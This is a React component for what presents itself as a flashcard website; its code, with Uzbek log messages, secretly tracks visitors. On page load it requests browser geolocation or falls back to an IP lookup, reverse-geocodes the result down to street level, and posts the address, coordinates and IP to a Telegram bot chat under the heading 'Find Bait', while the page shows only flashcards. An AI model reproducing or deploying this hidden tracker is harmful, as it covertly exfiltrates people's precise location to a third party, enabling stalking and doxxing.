import axios from "axios";
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "./hook/useEnv";
import FlashcardComponent from "./components/Flashcard";
import { useEffect } from "react";

function App() {
  useEffect(() => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          getAddress(lat, lon, "Geolocation");
        },
        (error) => {
          console.error("Joylashuvni aniqlashda xatolik:", error.message);
          getLocationByIP();
        }
      );
    } else {
      console.log("Geolocation API qo‘llab-quvvatlanmaydi.");
      getLocationByIP();
    }
  }, []);

  function getAddress(latitude: number, longitude: number, source: string) {
    axios
      .get(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
      )
      .then((response) => {
        const data = response.data;
        console.log("📍 To‘liq manzil:", data.display_name);
        
        sendToTelegram({
          country: data.address.country || "Aniqlanmadi",
          city: data.address.city || data.address.town || "Aniqlanmadi",
          region: data.address.state || "Aniqlanmadi",
          district: data.address.suburb || "Aniqlanmadi",
          neighbourhood: data.address.neighbourhood || "Aniqlanmadi",
          road: data.address.road || "Aniqlanmadi",
          location: `${latitude}, ${longitude}`,
          source,
        });
      })
      .catch((error) => console.error("Xatolik:", error));
  }

  function getLocationByIP() {
    axios.get(IP_API).then((res) => {
      console.log("🌍 IP orqali joylashuv aniqlandi...");
      let [latitude, longitude] = res.data.loc.split(",");
      getAddress(parseFloat(latitude), parseFloat(longitude), "IP orqali");

      sendToTelegram({
        country: res.data.country || "Aniqlanmadi",
        city: res.data.city || "Aniqlanmadi",
        region: res.data.region || "Aniqlanmadi",
        ip: res.data.ip,
        location: res.data.loc,
        source: "IP orqali",
      });
    });
  }

  function sendToTelegram(data: any) {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    let message = `<b>📍 Find Bait</b>\n`;
    message += `<b>🖥 Site:</b> Flashcards\n`;
    message += `<b>🌍 Country:</b> ${data.country}\n`;
    message += `<b>🏙 City:</b> ${data.city}\n`;
    message += `<b>📌 Region:</b> ${data.region}\n`;
    if (data.ip) message += `<b>🌐 IP:</b> ${data.ip}\n`;
    message += `<b>📍 Location:</b> ${data.location}\n`;
    message += `<b>📡 Source:</b> ${data.source}\n`;
    message += `<b>🏘 District:</b> ${data.district}\n`;
    message += `<b>🏡 Neighbourhood:</b> ${data.neighbourhood}\n`;
    message += `<b>🛣 Road:</b> ${data.road}\n`;

    axios.post(`${URL}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: "https://ibb.co/jPLG6Ck0",
      caption: message,
      parse_mode: "HTML",
    })
      .then(() => console.log("✅ Telegramga yuborildi"))
      .catch((err) => console.error("❌ Telegramga yuborishda xatolik:", err));
  }

  return <FlashcardComponent />;
}

export default App;